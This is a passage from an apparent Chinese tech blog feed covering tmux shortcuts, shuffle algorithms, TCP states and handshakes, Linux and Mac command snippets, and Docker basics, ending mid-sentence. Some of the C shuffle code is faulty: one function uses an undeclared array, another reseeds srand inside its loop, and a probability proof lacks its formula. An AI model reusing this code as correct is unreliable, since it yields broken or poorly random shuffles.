title="3.2.3.1、基本操作"></a>3.2.3.1、基本操作</h5><ul><li><code>?</code> 列出所有快捷键；按q返回</li><li><code>d</code> 脱离当前会话,可暂时返回Shell界面</li><li><code>s</code> 选择并切换会话；在同时开启了多个会话时使用</li><li><code>D</code> 选择要脱离的会话；在同时开启了多个会话时使用</li><li><code>:</code> 进入命令行模式；此时可输入支持的命令，例如 <code>kill-server</code> 关闭所有tmux会话</li><li><code>[</code> 复制模式，光标移动到复制内容位置，空格键开始，方向键选择复制，回车确认，q&#x2F;Esc退出</li><li><code>]</code> 进入粘贴模式，粘贴之前复制的内容，按q&#x2F;Esc退出</li><li><code>~</code> 列出提示信息缓存；其中包含了之前tmux返回的各种提示信息</li><li><code>t</code> 显示当前的时间</li><li><code>ctrl + z</code> 挂起当前会话</li></ul><h5 id="3-2-3-2、窗口操作"><a href="#3-2-3-2、窗口操作" class="headerlink" title="3.2.3.2、窗口操作"></a>3.2.3.2、窗口操作</h5><ul><li><code>c</code> 创建新窗口</li><li><code>&amp;</code> 关闭当前窗口</li><li><code>[0-9]</code> 数字键切换到指定窗口</li><li><code>p</code> 切换至上一窗口</li><li><code>n</code> 切换至下一窗口</li><li><code>l</code> 前后窗口间互相切换</li><li><code>w</code> 通过窗口列表切换窗口</li><li><code>,</code> 重命名当前窗口，便于识别</li><li><code>.</code> 修改当前窗口编号，相当于重新排序</li><li><code>f</code> 在所有窗口中查找关键词，便于窗口多了切换</li></ul><h5 id="3-2-3-3、面板操作"><a href="#3-2-3-3、面板操作" class="headerlink" title="3.2.3.3、面板操作"></a>3.2.3.3、面板操作</h5><ul><li><code>&quot;</code> 将当前面板上下分屏（我自己改成了 <code>|</code>）</li><li><code>%</code> 将当前面板左右分屏（我自己改成了 <code>-</code>）</li><li><code>x</code> 关闭当前分屏</li><li><code>!</code> 将当前面板置于新窗口,即新建一个窗口,其中仅包含当前面板</li><li><code>ctrl+方向键</code> 以1个单元格为单位移动边缘以调整当前面板大小</li><li><code>alt+方向键</code> 以5个单元格为单位移动边缘以调整当前面板大小</li><li><code>q</code> 显示面板编号</li><li><code>o</code> 选择当前窗口中下一个面板</li><li><code>方向键</code> 移动光标选择对应面板</li><li><code>&#123;</code> 向前置换当前面板</li><li><code>&#125;</code> 向后置换当前面板</li><li><code>alt+o</code> 逆时针旋转当前窗口的面板</li><li><code>ctrl+o</code> 顺时针旋转当前窗口的面板</li><li><code>z</code> 最大化当前所在面板</li><li><code>page up</code> 向上滚动屏幕，q 退出</li><li><code>page down</code> 向下滚动屏幕，q 退出</li></ul><h2 id="四、配置文件"><a href="#四、配置文件" class="headerlink" title="四、配置文件"></a>四、配置文件</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
            <tag> Tmux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三种洗牌算法shuffle</title>
      <link href="/2018/08/10/shuffle/"/>
      <url>/2018/08/10/shuffle/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>洗牌算法可以被理解为三种洗牌算法，分别是抽牌（Fisher-Yates Shuffle算法），换牌（Knuth-Durstenfeld Shhuffle算法）和插牌算法。</p><h2 id="二、具体算法"><a href="#二、具体算法" class="headerlink" title="二、具体算法"></a>二、具体算法</h2><h3 id="2-1、Fisher-Yates-洗牌算法（抽牌算法）"><a href="#2-1、Fisher-Yates-洗牌算法（抽牌算法）" class="headerlink" title="2.1、Fisher-Yates 洗牌算法（抽牌算法）"></a>2.1、Fisher-Yates 洗牌算法（抽牌算法）</h3><p>这个洗牌方法最早由<code>Ronald A. Fisher</code>和<code>Frank Yates</code>提出，即 <code>Fisher–Yates Shuffle</code>，其基本思想就是从原始数组中随机取一个之前没取过的数字到新的数组中，具体如下：</p><ul><li>初始化原始数组和新数组，原始数组长度为n(已知)；</li><li>从还没处理的数组（假如还剩k个）中，随机产生一个[0, k)之间的数组下标数字p；</li><li>从剩下的k个数中把下标为p的数取出，放在新数组的末尾（末尾有数字则放在末尾前一位，依次往前）；</li><li>重复步骤2和3直到数字全部取完，新数组的数字序列就是一个随机的序列；</li></ul><p> 下面证明其随机性，即每个元素被放置在新数组中的第i个位置是1&#x2F;n（假设数组大小是n）：</p><p><strong>证明：</strong>一个元素m被放入第i个位置的概率P &#x3D; 前i-1个位置选择元素时没有选中m的概率 * 第i个位置选中m的概率，即：</p><ul><li><p>时间复杂度：$O(n^2)$</p></li><li><p>空间复杂度：$O(n)$</p></li></ul><p>算法实现：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">suffleFisherYates</span><span class="params">(<span class="type">char</span> *source, <span class="type">char</span> *dest)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;POKER_NUM;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> index=rand()%(POKER_NUM-i)+i;         <span class="comment">//获取从i~POKER_NUM的一个索引</span></span><br><span class="line">        <span class="built_in">std</span>::swap(poker[i],poker[index]);        <span class="comment">//交换</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">suffleFisherYates</span><span class="params">(<span class="type">char</span> *date, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">char</span> t;    <span class="comment">//t为交换字符空间   </span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">while</span>(--length)&#123;</span><br><span class="line">        srand(time(<span class="number">0</span>));</span><br><span class="line">        i = rand()%(length+<span class="number">1</span>);</span><br><span class="line">        t = date[i];</span><br><span class="line">        date[i] = date[length];</span><br><span class="line">        date[length] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">MySwap</span><span class="params">(<span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> temp = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = temp;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">Shuffle</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>; i&gt;=<span class="number">1</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        MySwap(num[i], num[rand()%(i+<span class="number">1</span>)]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2、Knuth-Durstenfeld-洗牌算法（换牌算法）"><a href="#2-2、Knuth-Durstenfeld-洗牌算法（换牌算法）" class="headerlink" title="2.2、Knuth-Durstenfeld 洗牌算法（换牌算法）"></a>2.2、Knuth-Durstenfeld 洗牌算法（换牌算法）</h3><p>Knuth 和 Durstenfeld  在Fisher等人研究的基础上对算法进行了改进，在原始数组上对数字进行交互，省去了额外O(n)的空间。该算法的基本思想和 Fisher 类似，每次从未处理的数据中随机取出一个数字，然后把该数字放在数组的尾部，即数组尾部存放的是已经处理过的数字。</p><h4 id="2-2-1、算法思路"><a href="#2-2-1、算法思路" class="headerlink" title="2.2.1、算法思路"></a>2.2.1、算法思路</h4><ul><li>建立一个数组大小为n的数组，存放n个数值；</li><li>生成一个从0到m-1（假设数组未处理的大小为m）的数组下标随机数p；</li><li>获取数组中下标为p的数字，并将其与数组下标为m-1的元素互换，数组未处理的大小m减去1；</li><li>依次执行2，3步骤，最终原始数组变成了一个新的随机序列数组；</li></ul><h4 id="2-2-2、算法优缺点"><a href="#2-2-2、算法优缺点" class="headerlink" title="2.2.2、算法优缺点"></a>2.2.2、算法优缺点</h4><ul><li><p>优点：</p><ul><li>不需要额外占用多余的数组空间；</li></ul></li><li><p>缺点：</p><ul><li>必须知道数组的的长度，无法处理长度不固定的数组；</li><li>改变了原数组的排列顺序；</li><li>由于扫描的方式为从后往前，因此无法处理长度动态增长的数组；</li></ul></li></ul><h4 id="2-2-3、算法复杂度"><a href="#2-2-3、算法复杂度" class="headerlink" title="2.2.3、算法复杂度"></a>2.2.3、算法复杂度</h4><ul><li><p>时间复杂度：$O(n)$</p></li><li><p>空间复杂度：$O(1)$</p></li></ul><p>算法实现：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *<span class="title function_">shuffleKnuthDurstenfeld</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, p, tmp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  srand((<span class="type">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">  <span class="keyword">for</span>(i = len<span class="number">-1</span>; i&gt;=<span class="number">1</span>; i--) &#123;</span><br><span class="line">    p = rand()%(i+<span class="number">1</span>);</span><br><span class="line">    tmp = arr[i];</span><br><span class="line">    arr[i] = arr[p];</span><br><span class="line">    arr[p] = tmp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4、Inside-Out-Algorithm算法"><a href="#2-4、Inside-Out-Algorithm算法" class="headerlink" title="2.4、Inside-Out Algorithm算法"></a>2.4、Inside-Out Algorithm算法</h3><p>Knuth-Durstenfeld Shuffle 是一个内部打乱的算法，算法完成后原始数据被直接打乱，尽管这个方法可以节省空间，但在有些应用中可能需要保留原始数据，所以需要另外开辟一个数组来存储生成的新序列。<br>        Inside-Out Algorithm 算法的基本思思是从前向后扫描数据，把位置i的数据随机插入到前i个（包括第i个）位置中（假设为k），这个操作是在新数组中进行，然后把原始数据中位置k的数字替换新数组位置i的数字。其实效果相当于新数组中位置k和位置i的数字进行交互。</p><p>如果知道arr的lengh的话，可以改为for循环，由于是从前往后遍历，所以可以应对arr[]数目未知的情况，或者arr[]是一个动态增加的情况。<br>证明如下：<br>原数组的第 i 个元素（随机到的数）在新数组的前 i 个位置的概率都是：(1&#x2F;i) * [i&#x2F;(i+1)] * [(i+1)&#x2F;(i+2)] <em>…</em> [(n-1)&#x2F;n] &#x3D; 1&#x2F;n，（即第i次刚好随机放到了该位置，在后面的n-i 次选择中该数字不被选中）。<br>原数组的第 i 个元素（随机到的数）在新数组的 i+1 （包括i + 1）以后的位置（假设是第k个位置）的概率是：(1&#x2F;k) * [k&#x2F;(k+1)] * [(k+1)&#x2F;(k+2)] <em>…</em> [(n-1)&#x2F;n] &#x3D; 1&#x2F;n（即第k次刚好随机放到了该位置，在后面的n-k次选择中该数字不被选中）</p><ul><li><p>时间复杂度：$O(n)$</p></li><li><p>空间复杂度：$O(n)$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP状态转换详解</title>
      <link href="/2018/05/20/tcp-state-transition/"/>
      <url>/2018/05/20/tcp-state-transition/</url>
      
        <content type="html"><![CDATA[<h2 id="一、TCP的状态转换图示"><a href="#一、TCP的状态转换图示" class="headerlink" title="一、TCP的状态转换图示"></a>一、TCP的状态转换图示</h2><p><img src="https://cdn.bugwz.com/tcp-state-transition.png" alt="状态转换图解"></p><h3 id="1-1、TCP标志位"><a href="#1-1、TCP标志位" class="headerlink" title="1.1、TCP标志位"></a>1.1、TCP标志位</h3><ul><li><code>CWR(Congestion Window Reduce)</code>：拥塞窗口减少标志，由发送端设置，用来表明发送端接收到了设置<code>ECE</code>标志的TCP包，发送端通过降低发送窗口的大小来降低发送速率；</li><li><code>ECE(ECN Echo)</code>：ECN响应标志，在TCP的3次握手时表明一个TCP端是具备<a href="https://zh.wikipedia.org/wiki/%E6%98%BE%E5%BC%8F%E6%8B%A5%E5%A1%9E%E9%80%9A%E7%9F%A5">ECN(Explicit Congestion Notification)</a>功能的，并且表明接收到的TCP包的IP头部的ECN被设置为11，更多信息请参考<a href="https://tools.ietf.org/html/rfc793">RFC793</a>；</li><li><code>URG(Urgent)</code>：表示紧急标志(The Urgent Pointer)有效，目前已经很少使用；</li><li><code>ACK(Acknowledgment)</code>：取值为<code>1</code>时表示确认号有效，这是一个确认的TCP包，取值为<code>0</code>则不是确认包；</li><li><code>PSH(Push)</code>：该标志置位时，一般表示发送端缓存中已经没有待发送的数据，接收端不将该数据进行队列处理，而是尽可能快将数据转由应用处理，在处理<code>Telnet</code>或<code>Rlogin</code>等交互模式的连接时，该标志总是被置位的；</li><li><code>RST(Reset)</code>：用于复位相应的TCP连接，通常在发生异常或者错误的时候会触发复位TCP连接；</li><li><code>SYN(Synchronize)</code>：同步序列编号(Synchronize Sequence Numbers)有效，该标志仅在三次握手建立TCP连接时有效，它提示TCP连接的服务端检查序列编号，该序列编号为TCP连接初始端(一般是客户端)的初始序列编号；</li><li><code>FIN(Finish)</code>：带有该标志置位的数据包用来结束一个TCP会话，用来释放连接，表明发送方已经没有数据发送了；</li></ul><h3 id="1-2、TCP的状态含义"><a href="#1-2、TCP的状态含义" class="headerlink" title="1.2、TCP的状态含义"></a>1.2、TCP的状态含义</h3><ul><li><code>CLOSED</code>：虚拟的起始点，在连接超时或者关闭时候进入此状态，这并不是一个真正的状态，而是一个假想的起点和终点；</li><li><code>LISTEN</code>：表示服务器端的某个 SOCKET 处于监听状态，可以接受客户端的连接；</li><li><code>SYN_SENT</code>：表示客户端已经发送了<code>SYN</code>报文。当客户端 SOCKET 执行 <code>connect()</code> 进行连接时，它首先发送 <code>SYN</code> 报文，然后随即进入到 <code>SYN_SENT</code> 状态，该状态</li><li><code>SYN_RCVD</code>：表示服务器已经接收到了 <code>SYN</code> 报文，并且已经向客户端发送了<code>SYN</code>和<code>ACK</code>报文。在正常情况下，这是服务器端的一个短暂的中间状态，基本上用 <code>netstat</code> 很难看到这种状态。当 TCP 连接处于此状态时，再收到客户端的<code>ACK</code> 报文，它就会进入到 <code>ESTABLISHED</code> 状态；</li><li><code>ESTABLISHED</code>：表示 TCP 连接已经成功建立，数据可以进行传输；</li><li><code>FIN_WAIT_1</code>：表示主动关闭连接的一方已经向对方发送了<code>FIN</code>报文；</li><li><code>FIN_WAIT_2</code>：表示主动关闭连接的一方已经收到了对方发送的<code>ACK</code>报文。该状态有时可以用 netstat 看到；</li><li><code>CLOSE_WAIT</code>：表示被动关闭连接的一方已经收到了对方发送的<code>FIN</code>报文，并且自己已经发送了一个<code>ACK</code>报文给对方。接下来需要检查自己是否还有数据要发送给对方，如果没有的话就可以执行 <code>close()</code> 关闭这个 SOCKET 并发送 <code>FIN</code> 报文给对方，即关闭自己到对方这个方向的连接。有数据的话依据具体的策略（继续发送或者丢弃）去执行；</li><li><code>CLOSING</code>：表示主动关闭连接的一方收到了对方发送的<code>FIN</code>报文，并没有收到对方的<code>ACK</code>报文，表示双方都正在关闭 SOCKET 连接。这种状态比较少见，但当双方几乎在同时 <code>close()</code> 一个 SOCKET 的话，就出现了双方同时发送 <code>FIN</code> 报文的情况，这时就会出现 <code>CLOSING</code> 状态；</li><li><code>LAST_ACK</code>：表示被动关闭连接的一方已经发送了<code>FIN</code>报文，正在等待对方的<code>ACK</code>报文；</li><li><code>TIME_WAIT</code>：表示主动关闭的一方已经收到了对方的<code>FIN</code>报文，并且也已经发送出了<code>ACK</code>报文。<code>TIME_WAIT </code>状态下的 TCP 连接会等待 <code>2*MSL</code>（<code>Max Segment Lifetime</code>，最大分段生存期，指一个 TCP 报文在 Internet 上的最长生存时间。每个具体的 TCP 协议实现都必须选择一个确定的 <code>MSL</code> 值，<code>RFC 1122</code> 建议是 <code>2 分钟</code>，但 <code>BSD</code> 传统实现采用了 <code>30 秒</code>，Linux 可以 <code>cat /proc/sys/net/ipv4/tcp_fin_timeout</code> 看到本机的这个值）;</li></ul><h2 id="二、TCP的握手与挥手"><a href="#二、TCP的握手与挥手" class="headerlink" title="二、TCP的握手与挥手"></a>二、TCP的握手与挥手</h2><p><img src="https://cdn.bugwz.com/tcp-communication.png" alt="TCP通信过程"></p><h3 id="2-1、三次握手"><a href="#2-1、三次握手" class="headerlink" title="2.1、三次握手"></a>2.1、三次握手</h3><ul><li><code>Client</code>和<code>Server</code>的初始状态都是关闭状态，<code>Server</code>进入<code>LISTEN</code>状态后被动等待连接的建立；</li><li><code>Client</code>主动建立连接，向<code>Server</code>发送TCP建连的报文，在报文中标志位<code>SYN被置为1</code>，将序列号<code>seq被设置为x</code>(传送报文时的第一个字节序号为x)，由于<code>SYN</code>标记在逻辑上占用一个序列号，因此实际数据传输的时候，TCP传输的数据中第一个byte对应的系列号为<code>x+1</code>，这个<code>SYN</code>包发送以后，<code>Client</code>进入<code>SYN_SENT</code>状态，等待<code>Server</code>回复ACK确认包；</li><li><code>Server</code>在收到连接请求报文之后，发送确认报文。在确认报文中标志位<code>SYN被置为1</code>，<code>ACK被置为1</code>，同时确认号<code>ack = x + 1</code>，并设置<code>seq = y</code>，发送完此确认包之后，<code>Server</code>进入<code>SYN_RCVD</code>状态；</li><li><code>Client</code>收到确认报文后，回复确认收到数据包，数据包中标志位<code>ACK被置为1</code>，确认号<code>ack = y + 1</code>，然后<code>Client</code>进入<code>ESTABLISHED</code>，<code>Client</code>的TCP通知上层应用进程，连接已经建立成功；</li><li><code>Server</code>收到<code>Client</code>的回复确认数据包后，<code>Server</code>也进入<code>ESTABLISHED</code>状态，同时通知其上层应用进程当前TCP连接已经建立；</li></ul><h3 id="2-2、四次挥手"><a href="#2-2、四次挥手" class="headerlink" title="2.2、四次挥手"></a>2.2、四次挥手</h3><p>在B接收到A的确认包后，B立即进入关闭状态。A和B都进入关闭状态后整个TCP连接释放。</p><ul><li>初始状态下<code>Client</code>和<code>Server</code>都是处于<code>ESTABLISHED</code>状态；</li><li>当应用层没有带发送的数据并且要<code>Client</code>关闭TCP连接的时候，A在要释放连接的报文中将标志位<code>FIN设置为1</code>，<code>ACK设置为1</code>，将序列号<code>seq设置为u</code>，确认号<code>ack设置为v</code>，然后<code>Client</code>进入<code>FIN_WAIT_1</code>状态等待<code>Server</code>的确认；</li><li><code>Server</code>收到<code>Client</code>的<code>FIN包</code>之后，发送确认包（由于<code>FIN包</code>与<code>SYN包</code>都在逻辑上占<code>1byte</code>，因此确认号<code>ack = u + 1</code>，而这个报文段自己的序号为<code>seq = v</code>），然后<code>Server</code>进入<code>CLOSE_WAIT</code>状态，TCP服务器进程通知应用层进程；</li><li><code>Client</code>收到<code>Server</code>的确认包之后，<code>Client</code>进入<code>FIN_WAIT_2</code>状态；</li><li>如果<code>Server</code>已经没有要向<code>Client</code>发送的数据，上层应用进程就通知TCP释放连接，<code>Server</code>就会发送释放连接的数据包（标志位<code>FIN被置为1</code>，<code>ACK被置为1</code>，序列号<code>seq = v</code>，确认号<code>ack = u + 1</code>），然后<code>Server</code>进入<code>LAST_ACK</code>状态；</li><li>当<code>Client</code>收到释放连接的数据包后，必须要发送确认数据包，在确认报文中将标志位<code>ACK置为1</code>，确认号<code>ack = v + 1</code>，序列号<code>seq = u + 1</code>，然后<code>Client</code>进入<code>TIME_WAIT</code>状态，在<code>TIME_WAIT</code>状态下，<code>Client</code>经过<code>2MSL</code>的事件后就会进入<code>CLOSED</code>状态；</li><li>当<code>Server</code>收到<code>Client</code>的确认包之后，<code>Server</code>立刻进入<code>CLOSED</code>状态，当<code>Client</code>和<code>Server</code>都进入<code>CLOSED</code>状态后，整个TCP连接将被释放；</li></ul><h3 id="三、一些问题"><a href="#三、一些问题" class="headerlink" title="三、一些问题"></a>三、一些问题</h3><h3 id="3-1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？"><a href="#3-1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？" class="headerlink" title="3.1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？"></a>3.1、为什么建立连接协议是三次握手，而关闭连接却是四次握手呢？</h3><p>服务端的 LISTEN 状态下的 SOCKET 当收到 SYN 报文的连接请求后，它可以把 ACK 和 SYN（ACK 起应答作用，而 SYN 起同步作用）放在一个报文里来发送。但关闭连接时，当收到对方的 FIN 报文通知时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部发送给对方了，所以你可以未必会马上会关闭 SOCKET，也即你可能还需要发送一些数据给对方之后，再发送 FIN 报文给对方来表示你同意现在可以关闭连接了，所以它这里的 ACK 报文和 FIN 报文多数情况下都是分开发送的。</p><h3 id="3-2、为什么-TIME-WAIT-状态还需要等-2MSL-后才能返回到-CLOSED-状态？"><a href="#3-2、为什么-TIME-WAIT-状态还需要等-2MSL-后才能返回到-CLOSED-状态？" class="headerlink" title="3.2、为什么 TIME_WAIT 状态还需要等 2MSL 后才能返回到 CLOSED 状态？"></a>3.2、为什么 TIME_WAIT 状态还需要等 2MSL 后才能返回到 CLOSED 状态？</h3><ul><li><p><strong>可靠的实现 TCP 全双工连接的终止：</strong>TCP 协议在关闭连接的四次握手过程中，最终的 ACK 是由主动关闭连接的一端（后面统称 A 端）发出的，如果这个<code> ACK</code> 丢失，对方（后面统称 B 端）将重发出最终的 <code>FIN</code>，因此 A 端必须维护状态信息（TIME_WAIT）允许它重发最终的 <code>ACK</code>。如果 A 端不维持 <code>TIME_WAIT </code>状态，而是处于 <code>CLOSED </code>状态，那么 A 端将响应 <code>RST</code> 分节，B 端收到后将此分节解释成一个错误。因而，要实现 TCP 全双工连接的正常终止，必须处理终止过程中四个分节任何一个分节的丢失情况，主动关闭连接的 A 端必须维持 <code>TIME_WAIT</code> 状态 。</p></li><li><p><strong>允许老的重复分节在网络中消逝（<code>避免同一端口对应多个套接字</code>）：</strong>TCP 分节可能由于路由器异常而迷途，在迷途期间，TCP 发送端可能因确认超时而重发这个分节，迷途的分节在路由器修复后也会被送到最终目的地，这个迟到的迷途分节到达时可能会引起问题。在关闭前一个连接之后，马上又重新建立起一个相同的 IP 和端口之间的新连接，前一个连接的迷途重复分组在前一个连接终止后到达，而被新连接收到了。为了避免这个情况，TCP 协议不允许处于 <code>TIME_WAIT</code> 状态的连接启动一个新的可用连接，因为 <code>TIME_WAIT</code> 状态持续 <code>2MSL</code>，就可以保证当成功建立一个新 TCP 连接的时候，来自旧连接重复分组已经在网络中消逝；</p></li></ul><h3 id="3-3、关闭-TCP-连接一定需要四次挥手吗？"><a href="#3-3、关闭-TCP-连接一定需要四次挥手吗？" class="headerlink" title="3.3、关闭 TCP 连接一定需要四次挥手吗？"></a>3.3、关闭 TCP 连接一定需要四次挥手吗？</h3><p>不一定，四次挥手关闭 TCP 连接是最安全的做法。但在有些时候，我们不喜欢 <code>TIME_WAIT</code> 状态（如当 <code>MSL</code> 数值设置过大导致服务器端有太多<code> TIME_WAIT</code> 状态的 TCP 连接，减少这些条目数可以更快地关闭连接，为新连接释放更多资源），这时我们可以通过设置 SOCKET 变量的 <code>SO_LINGER</code> 标志来避免 SOCKET 在 close() 之后进入 <code>TIME_WAIT</code> 状态，这时将通过发送 <code>RST</code> 强制终止 <code>TCP</code> 连接（取代正常的 TCP 四次握手的终止方式）；</p>]]></content>
      
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> TCP/IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下的常用指令</title>
      <link href="/2018/01/01/commands-linux/"/>
      <url>/2018/01/01/commands-linux/</url>
      
        <content type="html"><![CDATA[<h3 id="CPU相关"><a href="#CPU相关" class="headerlink" title="CPU相关"></a>CPU相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看CPU物理核心</span></span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&#x27;physical id&#x27;</span> | <span class="built_in">sort</span> -u | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># 查看CPU核心总数</span></span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&#x27;cpu cores&#x27;</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># 查看逻辑CPU</span></span><br><span class="line"><span class="built_in">cat</span> /proc/cpuinfo | grep <span class="string">&#x27;processor&#x27;</span> | <span class="built_in">wc</span> -l</span><br><span class="line"><span class="comment"># 查看指定进程的线程情况</span></span><br><span class="line">ps -mp 8463 -o THREAD,tid,time</span><br><span class="line"><span class="comment"># 查看进程的线程CPU占用</span></span><br><span class="line">top -H -p 32286</span><br></pre></td></tr></table></figure><h3 id="内存相关"><a href="#内存相关" class="headerlink" title="内存相关"></a>内存相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 释放页面缓存</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"><span class="comment"># 释放目录缓存、文件缓存</span></span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"><span class="comment"># 释放页面缓存、目录缓存、文件缓存</span></span><br><span class="line"><span class="built_in">echo</span> 3 &gt; /proc/sys/vm/drop_caches</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否开启内存大页</span></span><br><span class="line"><span class="built_in">cat</span> /proc/meminfo | grep <span class="string">&#x27;Huge&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭透明大页</span></span><br><span class="line"><span class="built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/enabled</span><br><span class="line"><span class="built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/defrag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/defrag&#x27;</span> &gt;&gt; /etc/rc.d/rc.local</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled&#x27;</span> &gt;&gt; /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><h3 id="Docker相关"><a href="#Docker相关" class="headerlink" title="Docker相关"></a>Docker相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清理无用的容器</span></span><br><span class="line">docker system prune</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac下的常用指令</title>
      <link href="/2018/01/01/commands-mac/"/>
      <url>/2018/01/01/commands-mac/</url>
      
        <content type="html"><![CDATA[<h3 id="系统操作相关"><a href="#系统操作相关" class="headerlink" title="系统操作相关"></a>系统操作相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 重置 Launchpad</span></span><br><span class="line"><span class="built_in">cd</span> ~/Library/Application\ Support/Dock/</span><br><span class="line"><span class="built_in">rm</span> ~/Library/Application\ Support/Dock/*.db &amp;&amp; killall Dock</span><br><span class="line">defaults write com.apple.dock ResetLaunchPad -bool <span class="literal">true</span> &amp;&amp; killall Dock</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> Commands </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker底层设计-Docker学习笔记</title>
      <link href="/2017/10/15/docker-3/"/>
      <url>/2017/10/15/docker-3/</url>
      
        <content type="html"><![CDATA[<h2 id="一、基本架构"><a href="#一、基本架构" class="headerlink" title="一、基本架构"></a>一、基本架构</h2><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便，一下列出了 Docker 和传统虚拟化方式的不同的设计：</p><p><img src="https://cdn.bugwz.com/v-1.png" alt="传统虚拟化"></p><p><img src="https://cdn.bugwz.com/v-2.png" alt="Docker"></p><p>Docker 采用了 <code>C/S</code> 架构，包括客户端和服务端。Docker 守护进程 （<code>Daemon</code>）作为服务端接受来自客户端的请求，并处理这些请求（创建、运行、分发容器）。</p><p>客户端和服务端既可以运行在一个机器上，也可通过 <code>socket</code> 或者 <code>RESTful API</code> 来进行通信。</p><p>Docker 守护进程一般在宿主主机后台运行，等待接收来自客户端的消息。</p><p>Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟 Docker 守护进程交互。</p><p><img src="https://cdn.bugwz.com/docker-basic.png" alt="Docker 基本架构"></p><h2 id="二、命名空间"><a href="#二、命名空间" class="headerlink" title="二、命名空间"></a>二、命名空间</h2><p>命名空间是 Linux 内核一个强大的特性。每个容器都有自己单独的命名空间，运行在其中的应用都像是在独立的操作系统中运行一样。命名空间保证了容器之间彼此互不影响。</p><h3 id="2-1、pid-命名空间"><a href="#2-1、pid-命名空间" class="headerlink" title="2.1、pid 命名空间"></a>2.1、pid 命名空间</h3><p>不同用户的进程就是通过 pid 命名空间隔离开的，且不同命名空间中可以有相同 pid。所有的 LXC 进程在 Docker 中的父进程为Docker进程，每个 LXC 进程具有不同的命名空间。同时由于允许嵌套，因此可以很方便的实现嵌套的 Docker 容器。</p><h3 id="2-2、net-命名空间"><a href="#2-2、net-命名空间" class="headerlink" title="2.2、net 命名空间"></a>2.2、net 命名空间</h3><p>有了 pid 命名空间, 